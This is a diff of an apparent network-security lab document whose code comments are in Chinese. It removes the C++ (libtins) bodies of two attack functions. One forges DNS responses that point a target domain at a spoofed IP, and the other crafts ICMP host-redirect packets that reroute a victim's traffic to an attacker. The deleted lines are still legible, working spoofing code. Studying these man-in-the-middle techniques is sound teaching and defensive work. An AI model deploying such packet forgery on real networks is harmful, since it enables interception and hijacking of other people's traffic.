@@ -118,29 +118,10 @@ const IPv4Address spoofed_ip("140.113.24.241");
 ```cpp
 bool spoof_dns_response(const EthernetII& eth, const IP& ip, const UDP& udp, const DNS& dns, const DNS::query& query) {
     // 建立偽造的 DNS 回應
-    DNS spoofed_dns;
-    spoofed_dns.id(dns.id());
-    spoofed_dns.type(DNS::RESPONSE);
-    spoofed_dns.recursion_desired(dns.recursion_desired());
-    spoofed_dns.recursion_available(true);
-    spoofed_dns.add_query(query);
     
     // 添加偽造的 A 記錄
-    DNS::resource answer;
-    answer.dname(target_domain);
-    answer.query_type(DNS::A);
-    answer.query_class(query.query_class());
-    answer.ttl(300);
-    answer.data(spoofed_ip.to_string());
-    spoofed_dns.add_answer(answer);
     
     // 建立完整的回應封包
-    EthernetII response_eth(eth.src_addr(), eth.dst_addr());
-    IP response_ip(ip.src_addr(), ip.dst_addr());
-    UDP response_udp(udp.sport(), udp.dport());
-    
-    auto packet = response_eth / response_ip / response_udp / spoofed_dns;
-    sender.send(packet);
 }
 ```
 
@@ -168,37 +149,14 @@ void send_icmp_redirect(const std::string& iface_name,
                         const std::string& target_ip_str) {
     
     // 建立偽造的內部 IP 封包
-    IP inner_ip(target_ip, victim_ip);
-    inner_ip.ttl(64);
-    inner_ip.id(0);
-    inner_ip.flags(IP::Flags(0));
-    inner_ip.protocol(1);
     
     // 建立 ICMP Echo 回應作為負載
-    ICMP echo(ICMP::ECHO_REPLY);
-    echo.id(0);
-    echo.sequence(0);
     
     // 序列化偽造的原始資料包
-    IP inner_packet = inner_ip / echo;
-    std::vector<uint8_t> inner_bytes = inner_packet.serialize();
     
     // 建立 ICMP 重定向訊息
-    RawPDU inner_raw(inner_bytes);
-    ICMP redirect(ICMP::REDIRECT);
-    redirect.code(1);  // Code 1 = Host redirect
-    redirect.gateway(attacker_ip);  // 重定向到攻擊者
-    redirect.inner_pdu(inner_raw);
     
     // 包裝外層 IP 和 Ethernet
-    IP ip_outer(victim_ip, gateway_ip);
-    ip_outer.protocol(1);
-    
-    EthernetII eth(victim_mac, attacker_mac);
-    eth.payload_type(EthernetII::IP);
-    
-    auto packet = eth / ip_outer / redirect;
-    sender.send(packet, iface);
 }
 ```
 
